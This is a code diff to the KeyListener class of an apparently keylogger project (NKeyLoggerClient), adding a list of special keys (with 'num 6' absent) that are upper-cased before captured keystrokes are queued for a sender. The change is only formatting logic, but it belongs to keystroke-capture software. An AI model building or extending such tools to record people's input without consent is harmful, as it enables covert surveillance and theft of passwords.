@@ -10,6 +10,42 @@ using NKeyLoggerLib;
 namespace NKeyLoggerClient;
 internal class KeyListener : IDisposable
 {
+    private static readonly HashSet<string> specialKeys = new HashSet<string>()
+    {
+        "caps lock",
+        "scroll lock",
+        "right shift",
+        "alt",
+        "ctrl",
+        "tab",
+        "esc",
+        "shift",
+        "backspace",
+        "enter",
+        "pause",
+        "num 0",
+        "num 1",
+        "num 2",
+        "num 3",
+        "num 4",
+        "num 5",
+        "num 7",
+        "num 8",
+        "num 9",
+        "num *",
+        "f1",
+        "f2",
+        "f3",
+        "f4",
+        "f5",
+        "f6",
+        "f7",
+        "f8",
+        "f9",
+        "f10",
+        "f11",
+        "f12",
+    };
     private readonly NativeKeyListener nativeListener = new NativeKeyListener();
     private ConcurrentQueue<AbstractKeyInfo> keysQueue { get; set; } = new ConcurrentQueue<AbstractKeyInfo>();
     public ISender? sender { get; set; } = null;
@@ -74,9 +110,16 @@ internal class KeyListener : IDisposable
     }
     private void takeKey(AbstractKeyInfo info)
     {
-        KeyInfo keyInfo = info as KeyInfo;
-        if (keyInfo.Key == "caps lock")
-            keyInfo.Key = "CAPS LOCK";
+        KeyInfo? keyInfo = info as KeyInfo;
+
+        if (keyInfo is null)
+            throw new ArgumentException("AbstractKeyInfo must be KeyInfo");
+
+        lock (specialKeys)
+        {
+            if (specialKeys.Contains(keyInfo.Key.ToLower()))
+                keyInfo.Key = keyInfo.Key.ToUpper();
+        }
         keysQueue.Enqueue(info);
     }
 
